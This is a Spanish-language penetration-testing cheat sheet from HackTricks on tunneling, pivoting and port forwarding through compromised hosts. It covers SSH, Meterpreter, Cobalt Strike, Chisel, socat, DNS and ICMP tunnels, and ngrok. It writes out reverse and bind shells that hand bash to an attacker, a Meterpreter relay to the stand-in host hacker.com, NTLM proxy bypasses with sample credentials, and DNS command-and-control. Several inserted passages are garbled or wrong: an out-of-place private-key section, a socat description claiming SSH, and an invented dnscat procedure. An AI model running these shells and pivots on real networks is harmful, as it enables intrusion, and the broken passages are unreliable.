# Tunelización y Reenvío de Puertos

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Consigue la [**merchandising oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Consejo de Nmap

{% hint style="warning" %}
Los escaneos **ICMP** y **SYN** no se pueden tunelizar a través de proxies socks, por lo que debemos **desactivar el descubrimiento de ping** (`-Pn`) y especificar **escaneos TCP** (`-sT`) para que funcione.
{% endhint %}

## **Bash**

**Host -> Salto -> InternoA -> InternoB**
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

Conexión gráfica SSH (X)
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Puerto Local a Puerto Remoto

Abrir un nuevo puerto en el servidor SSH --> Otro puerto
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Puerto a Puerto

Puerto local --> Host comprometido (SSH) --> Tercer\_equipo:Puerto
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host 
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

Puerto local --> Host comprometido (SSH) --> Donde sea
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Reenvío de puertos inverso

Esto es útil para obtener shells inversos desde hosts internos a través de una DMZ hacia su host:
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and caputure it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems 
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

Necesitas **tener permisos de root en ambos dispositivos** (ya que vas a crear nuevas interfaces) y la configuración de sshd debe permitir el inicio de sesión como root:\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ifconfig tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ifconfig tun0 up #Activate the server side network interface
```
Habilitar el reenvío en el lado del servidor
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
Establecer una nueva ruta en el lado del cliente
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
## SSHUTTLE

Puedes **tunelizar** todo el **tráfico** hacia una **subred** a través de un host mediante **ssh**.\
Por ejemplo, redirigiendo todo el tráfico que va hacia 10.10.10.0/24.
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
# Conectar con una clave privada

En algunos casos, la conexión a un servidor remoto solo es posible mediante una clave privada. En estos casos, se puede utilizar la opción `-i` de `ssh` para especificar la ruta de la clave privada a utilizar.

```bash
ssh -i /path/to/private/key user@host
```

También se puede agregar la clave privada al agente SSH para evitar tener que especificar la ruta de la clave cada vez que se conecta al servidor.

```bash
ssh-add /path/to/private/key
ssh user@host
```

Si se tiene una clave privada protegida por contraseña, se debe desbloquear antes de agregarla al agente SSH.

```bash
ssh-add /path/to/unlocked/private/key
```
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

### Port2Port

Puerto local --> Host comprometido (sesión activa) --> Tercer\_equipo:Puerto
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS

SOCKS es un protocolo de red que permite a los usuarios de una red privada acceder a Internet a través de un servidor proxy. SOCKS se utiliza comúnmente para eludir las restricciones de red y para ocultar la dirección IP del usuario. SOCKS se puede utilizar para el tráfico de cualquier protocolo de red, incluidos HTTP, SMTP, POP3 y FTP. 

Para usar SOCKS, se necesita un cliente SOCKS y un servidor SOCKS. El cliente SOCKS se ejecuta en la máquina del usuario y se configura para enviar todo el tráfico de red a través del servidor SOCKS. El servidor SOCKS se ejecuta en una máquina remota y actúa como intermediario entre el cliente SOCKS y el destino final de la conexión de red.

SOCKS es una buena opción para eludir las restricciones de red, ya que no está limitado a un protocolo de red específico y puede enrutar todo el tráfico de red a través del servidor SOCKS. Sin embargo, SOCKS no proporciona cifrado de extremo a extremo, lo que significa que el tráfico de red puede ser interceptado y leído por terceros.
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
Otra forma:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

### Proxy SOCKS

Abra un puerto en el servidor de equipo que escuche en todas las interfaces que se puedan usar para **enrutar el tráfico a través del beacon**.
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

{% hint style="warning" %}
En este caso, el **puerto se abre en el host beacon**, no en el Servidor de Equipo y el tráfico se envía al Servidor de Equipo y desde allí al host:puerto indicado.
{% endhint %}
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
A tener en cuenta:

* El reenvío de puerto inverso de Beacon **siempre tuneliza el tráfico hacia el Servidor de Equipo** y el **Servidor de Equipo envía el tráfico a su destino previsto**, por lo que no debe usarse para relé de tráfico entre máquinas individuales.
* El **tráfico se tuneliza dentro del tráfico C2 de Beacon**, no sobre sockets separados, y también funciona sobre enlaces P2P.
* **No es necesario ser un administrador local** para crear reenvíos de puerto inversos en puertos altos.

### rPort2Port local

{% hint style="warning" %}
En este caso, el **puerto se abre en el host de Beacon**, no en el Servidor de Equipo y el **tráfico se envía al cliente de Cobalt Strike** (no al Servidor de Equipo) y desde allí al host:puerto indicado.
{% endhint %}
```
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Necesitas subir un túnel de archivo web: ashx|aspx|js|jsp|php|php|jsp
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

Puedes descargarlo desde la página de lanzamientos de [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
Necesitas usar la **misma versión para el cliente y el servidor**

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Reenvío de puertos
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Túnel inverso. El túnel se inicia desde la víctima.\
Se crea un proxy socks4 en 127.0.0.1:1080.
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
Pivotar a través de un proxy **NTLM**
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Shell de enlace
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Shell inversa
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port

Port2Port es una técnica de reenvío de puertos que permite redirigir el tráfico de un puerto local a un puerto remoto a través de una conexión SSH. Esto es útil cuando se necesita acceder a un servicio que se ejecuta en un servidor remoto al que no se puede acceder directamente desde el equipo local. 

Para utilizar Port2Port, se debe establecer una conexión SSH con el servidor remoto y especificar el puerto local y el puerto remoto que se desea redirigir. Una vez establecida la conexión, todo el tráfico que llegue al puerto local será redirigido al puerto remoto a través de la conexión SSH. 

Por ejemplo, si se desea acceder a un servidor web que se ejecuta en el puerto 80 de un servidor remoto, se puede utilizar Port2Port para redirigir el tráfico del puerto 8080 del equipo local al puerto 80 del servidor remoto a través de una conexión SSH. De esta manera, se puede acceder al servidor web remoto desde el equipo local a través del puerto 8080.
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### Port2Port a través de socks
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### Meterpreter a través de SSL Socat
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
Puedes saltarte un **proxy no autenticado** ejecutando esta línea en lugar de la última en la consola de la víctima:
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
### Túnel SSL con Socat

**Consola /bin/sh**

Crear certificados en ambos lados: Cliente y Servidor.
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Port2Port Remoto

Conecta el puerto SSH local (22) al puerto 443 del host atacante.
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost 
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22 
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

Es como una versión de consola de PuTTY (las opciones son muy similares a las de un cliente ssh).

Como este binario se ejecutará en la víctima y es un cliente ssh, necesitamos abrir nuestro servicio ssh y puerto para poder tener una conexión inversa. Luego, para reenviar solo el puerto accesible localmente a un puerto en nuestra máquina:
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Puerto a puerto

Es necesario ser un administrador local (para cualquier puerto)
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444 
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

Es necesario tener **acceso RDP al sistema**.\
Descarga:

1. [Binarios SocksOverRDP x64](https://github.com/nccgroup/SocksOverRDP/releases) - Esta herramienta utiliza los `Canales Virtuales Dinámicos` (`DVC`) de la función de Servicio de Escritorio Remoto de Windows. DVC es responsable de **tunelizar paquetes a través de la conexión RDP**.
2. [Binario Portátil de Proxifier](https://www.proxifier.com/download/#win-tab)

En tu ordenador cliente carga **`SocksOverRDP-Plugin.dll`** de esta manera:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
Ahora podemos **conectarnos** al **objetivo** a través de **RDP** usando **`mstsc.exe`**, y deberíamos recibir un **mensaje** que dice que el complemento **SocksOverRDP** está habilitado y que escuchará en **127.0.0.1:1080**.

**Conéctese** a través de **RDP** y cargue y ejecute en la máquina víctima el binario **`SocksOverRDP-Server.exe`**:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
Ahora, confirma en tu máquina (atacante) que el puerto 1080 está escuchando:
```
netstat -antb | findstr 1080
```
Ahora puedes usar [**Proxifier**](https://www.proxifier.com/) **para hacer un proxy del tráfico a través de ese puerto.**

## Proxificar aplicaciones GUI de Windows

Puedes hacer que las aplicaciones GUI de Windows naveguen a través de un proxy usando [**Proxifier**](https://www.proxifier.com/).\
En **Perfil -> Servidores Proxy** agrega la dirección IP y el puerto del servidor SOCKS.\
En **Perfil -> Reglas de Proxificación** agrega el nombre del programa a proxificar y las conexiones a las direcciones IP que deseas proxificar.

## Bypass de proxy NTLM

La herramienta mencionada anteriormente: **Rpivot**\
**OpenVPN** también puede evitarlo, configurando estas opciones en el archivo de configuración:
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Cntlm autentica contra un proxy y enlaza un puerto local que se reenvía al servicio externo que especifiques. Luego, puedes usar la herramienta que elijas a través de este puerto.\
Por ejemplo, se puede reenviar el puerto 443.
```
Username Alice 
Password P@ssw0rd 
Domain CONTOSO.COM 
Proxy 10.0.0.10:8080 
Tunnel 2222:<attackers_machine>:443
```
Ahora, si configuras, por ejemplo, en la víctima el servicio **SSH** para que escuche en el puerto 443, puedes conectarte a él a través del puerto 2222 del atacante.\
También podrías usar un **meterpreter** que se conecte a localhost:443 y el atacante esté escuchando en el puerto 2222.

## YARP

Un proxy inverso creado por Microsoft. Puedes encontrarlo aquí: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Se necesita acceso de root en ambos sistemas para crear adaptadores tun y tunelizar datos entre ellos utilizando consultas DNS.
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
El túnel será muy lento. Puedes crear una conexión SSH comprimida a través de este túnel usando:
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

****[**Descárgalo aquí**](https://github.com/iagox86/dnscat2)**.**

Establece un canal C\&C a través de DNS. No necesita privilegios de root.
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **En PowerShell**

Puedes usar [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) para ejecutar un cliente dnscat2 en PowerShell:
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd 
```
#### **Reenvío de puertos con dnscat**

---

Dnscat es una herramienta que permite el reenvío de puertos a través de DNS. Esto significa que podemos enviar tráfico de red a través de un canal DNS, lo que puede ser útil en situaciones en las que el tráfico de red está restringido o filtrado.

Para utilizar dnscat, necesitamos un servidor DNS que permita la actualización dinámica de registros DNS. Podemos utilizar un servidor DNS público como `nsupdate.info` o configurar nuestro propio servidor DNS.

Una vez que tenemos un servidor DNS configurado, podemos utilizar dnscat para crear un túnel de red. Primero, necesitamos iniciar un servidor dnscat en nuestro servidor DNS:

```
dnscat2 --dns <DNS_SERVER_IP>
```

Esto iniciará un servidor dnscat que escuchará en el puerto 53 de nuestro servidor DNS. A continuación, podemos iniciar un cliente dnscat en nuestra máquina local para conectarnos al servidor:

```
dnscat2 --host <DNS_SERVER_IP>
```

Esto iniciará un cliente dnscat que se conectará al servidor dnscat en nuestro servidor DNS. A partir de aquí, podemos utilizar el túnel de red para enviar tráfico a través de DNS.

Por ejemplo, para reenviar el tráfico del puerto 80 a través del túnel, podemos utilizar el siguiente comando en nuestra máquina local:

```
ssh -R 80:localhost:80 <USERNAME>@<SERVER_IP>
```

Esto reenviará el tráfico del puerto 80 de nuestro servidor al puerto 80 de nuestra máquina local a través del túnel dnscat.

---

**Nota:** Dnscat no es una herramienta segura para el anonimato o la privacidad, ya que el tráfico se envía a través de DNS, lo que puede ser monitoreado y filtrado por los proveedores de servicios de Internet y otros atacantes.
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### Cambiar el DNS de proxychains

Proxychains intercepta la llamada libc `gethostbyname` y tuneliza la solicitud tcp DNS a través del proxy socks. Por **defecto**, el servidor **DNS** que usa proxychains es **4.2.2.2** (codificado). Para cambiarlo, edite el archivo: _/usr/lib/proxychains3/proxyresolv_ y cambie la IP. Si está en un entorno de **Windows**, podría establecer la IP del **controlador de dominio**.

## Túneles en Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

## Tunneling ICMP

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Se necesita root en ambos sistemas para crear adaptadores tun y tunelizar datos entre ellos utilizando solicitudes de eco ICMP.
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

****[**Descárgalo desde aquí**](https://github.com/utoni/ptunnel-ng.git).
```bash
# Generate it
sudo ./autogen.sh 

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

**[ngrok](https://ngrok.com/) es una herramienta para exponer soluciones a Internet en una sola línea de comando.**  
*Las URI de exposición son como:* **UID.ngrok.io**

### Instalación

- Crear una cuenta: https://ngrok.com/signup
- Descargar el cliente:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### Usos básicos

**Documentación:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

*También es posible agregar autenticación y TLS, si es necesario.*

#### Tunelización TCP
```bash
# Pointing to 0.0.0.0:4444 
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### Exponiendo archivos con HTTP
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### Sniffing de llamadas HTTP

*Útil para XSS, SSRF, SSTI ...*  
Directamente desde stdout o en la interfaz HTTP [http://127.0.0.1:4040](http://127.0.0.1:4000).

#### Tunelización de servicio HTTP interno
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### Ejemplo de configuración simple de ngrok.yaml

Abre 3 túneles:
- 2 TCP
- 1 HTTP con exposición de archivos estáticos desde /tmp/httpbin/
```yaml
tunnels:
  mytcp:
    addr: 4444
    proto: tcp
  anothertcp:
    addr: 5555
    proto: tcp
  httpstatic:
    proto: http
    addr: file:///tmp/httpbin/
```
## Otras herramientas para revisar

* [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
* [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Revisa los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
